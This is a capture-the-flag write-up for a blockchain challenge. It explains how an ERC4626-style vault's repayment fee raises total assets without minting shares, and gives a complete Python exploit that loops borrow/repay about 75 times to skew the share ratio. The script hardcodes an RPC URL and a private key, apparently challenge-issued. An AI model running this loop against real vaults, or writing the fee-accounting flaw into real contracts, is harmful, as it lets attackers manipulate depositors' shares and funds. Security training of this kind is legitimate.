# Signin (solved by: @snhplayer)

## Category: Blockchain • Points: 200

## Challenge Description

In this CTF challenge, we're provided with three smart contracts:
- **Setup.sol** - main contract with `solve()` function for solution verification
- **Vault.sol** - ERC4626-compatible vault with borrowing functionality
- **LING.sol** - standard ERC20 token

**Objective**: Make the `solve()` function execute successfully by tricking the system so that depositing 999 ether LING tokens yields less than 500 ether vault shares.

## Vulnerability Analysis

### Key Vulnerability

The critical vulnerability is located in the `repayAssets` function of the `Vault` contract:

```solidity
function repayAssets(uint256 amount) external {
    // ... checks ...
    uint256 fee = (amount * 1) / 100; // 1% fee
    borrowedAssets[msg.sender] -= amount;
    totalBorrowedAssets -= amount;
    totalAsset.amount += fee; // <--- VULNERABILITY!
    ling.transferFrom(msg.sender, address(this), amount + fee);
}
```

When repaying debt, the fee is added to `totalAsset.amount`, but `totalAsset.shares` remains unchanged. This breaks the ratio between assets and shares.

### Exploitation Mechanism

The formula for calculating shares received on deposit:
```
shares = (assets × totalAsset.shares) / totalAsset.amount
```

If `totalAsset.amount` is artificially inflated, fewer shares will be issued for the same amount of deposited assets.

**Success condition**: `totalAsset.amount / totalAsset.shares > 999 / 500 = 1.998`

## Attack Strategy

### Action Plan

1. **Get tokens**: Call `claim()` to receive 1 ether LING
2. **Initial deposit**: Deposit a small amount to create a base
3. **Attack loop**: Repeatedly borrow and repay with fees
4. **Solution**: Call `solve()` after achieving the required ratio

### Attack Mathematics

Each "borrow → repay" cycle increases `totalAsset.amount` by 1% of the borrowed amount:
- After 1 cycle: ratio = 1.01
- After n cycles: ratio = (1.01)^n
- To achieve 1.998: n = log(1.998) / log(1.01) ≈ 70 cycles

## Technical Implementation

### Environment Setup

```python
from web3 import Web3
import json

# Configuration
RPC_URL = "http://s1.r3.ret.sh.cn:31895/"
PRIVATE_KEY = "0x1d650c94710a72dc9980ef8c46c760893c47ffb2b065d56228b0d15bf38026f6"
SETUP_CONTRACT_ADDRESS = "0xaE1e348Fbf07545b2380D985087F28b173e7B61E"
```

### Core Algorithm

```python
def exploit_vault():
    # 1. Get tokens
    send_tx(setup_contract.functions.claim())
    
    # 2. Approve token spending
    approve_amount = w3.to_wei(1000, 'ether')
    send_tx(ling_contract.functions.approve(vault_address, approve_amount))
    
    # 3. Initial deposit
    deposit_amount = 100000  # wei (minimum for fee generation)
    send_tx(vault_contract.functions.deposit(deposit_amount, account.address))
    
    # 4. Attack loop
    for i in range(75):  # 75 cycles for safety
        borrow_amount = vault_contract.functions.totalAssets().call()
        send_tx(vault_contract.functions.borrowAssets(borrow_amount))
        send_tx(vault_contract.functions.repayAssets(borrow_amount))
    
    # 5. Solve the challenge
    send_tx(setup_contract.functions.solve())
```

## Complete Exploit

```python
from web3 import Web3
import json

# --- CONFIGURATION ---
RPC_URL = "http://s1.r3.ret.sh.cn:31895/"
PRIVATE_KEY = "0x1d650c94710a72dc9980ef8c46c760893c47ffb2b065d56228b0d15bf38026f6"
SETUP_CONTRACT_ADDRESS = "0xaE1e348Fbf07545b2380D985087F28b173e7B61E"

# --- CONTRACT ABIs ---
SETUP_ABI = json.loads('''[
    {"inputs":[],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"vault","outputs":[{"internalType":"contract Vault","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"ling","outputs":[{"internalType":"contract LING","name":"","type":"address"}],"stateMutability":"view","type":"function"}
]''')

VAULT_ABI = json.loads('''[
    {"inputs":[{"internalType":"uint256","name":"assets","type":"uint256"},{"internalType":"address","name":"receiver","type":"address"}],"name":"deposit","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"borrowAssets","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"repayAssets","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"totalAssets","outputs":[{"internalType":"uint256","name":"totalManagedAssets","type":"uint256"}],"stateMutability":"view","type":"function"}
]''')

LING_ABI = json.loads('''[
    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
]''')

# --- Web3 Setup ---
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)
w3.eth.default_account = account.address

def send_tx(tx_func):
    """Builds, signs and sends a transaction."""
    tx = tx_func.build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 1000000,
        'gasPrice': w3.eth.gas_price
    })
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
    return receipt

def main():
    print("\n[+] Blockchain CTF - Vault Exploit")
    print("=" * 50)
    
    # Load contracts
    setup_contract = w3.eth.contract(address=SETUP_CONTRACT_ADDRESS, abi=SETUP_ABI)
    vault_address = setup_contract.functions.vault().call()
    ling_address = setup_contract.functions.ling().call()
    vault_contract = w3.eth.contract(address=vault_address, abi=VAULT_ABI)
    ling_contract = w3.eth.contract(address=ling_address, abi=LING_ABI)
    
    print(f"Vault: {vault_address}")
    print(f"LING: {ling_address}")
    print(f"Player: {account.address}")
    
    # Step 1: Get tokens
    print("\n[1] Claiming LING tokens...")
    send_tx(setup_contract.functions.claim())
    
    # Step 2: Approve spending
    print("[2] Approving Vault contract...")
    send_tx(ling_contract.functions.approve(vault_address, w3.to_wei(1000, 'ether')))
    
    # Step 3: Initial deposit
    print("[3] Making initial deposit...")
    send_tx(vault_contract.functions.deposit(100000, account.address))
    
    # Step 4: Attack loop
    print("[4] Starting attack loop to inflate asset value...")
    for i in range(75):
        try:
            borrow_amount = vault_contract.functions.totalAssets().call()
            if borrow_amount == 0:
                break
            send_tx(vault_contract.functions.borrowAssets(borrow_amount))
            send_tx(vault_contract.functions.repayAssets(borrow_amount))
            if (i + 1) % 10 == 0:
                print(f"  Completed {i + 1}/75 cycles")
        except Exception as e:
            print(f"  Error in cycle {i+1}: {e}")
            break
    
    # Step 5: Solve challenge
    print("[5] Calling solve() function...")
    send_tx(setup_contract.functions.solve())
    
    # Check result
    is_solved = setup_contract.functions.isSolved().call()
    if is_solved:
        print("\nSUCCESS! Challenge solved!")
    else:
        print("\nChallenge not solved")

if __name__ == "__main__":
    main()
```

## Results

After executing the exploit:

1. **Asset-to-share ratio** increased from 1:1 to ~2:1
2. **Depositing 999 ether** LING yields only ~499 ether vault shares
3. **The solve() function** executes successfully
4. **The solved flag** is set to `true`

**Flag captured!** 🎉

## Exploitation Summary

| Step | Action | Purpose |
|------|--------|---------|
| 1 | Call `claim()` | Get initial LING tokens |
| 2 | Approve spending | Allow vault to use our tokens |
| 3 | Initial deposit | Create base for borrowing |
| 4 | Borrow/repay loop | Inflate `totalAsset.amount` via fees |
| 5 | Call `solve()` | Exploit the manipulated ratio |

The attack exploits the fact that repayment fees increase the total asset amount without corresponding share increases, breaking the ERC4626 invariant and allowing us to receive fewer shares than expected for our deposit.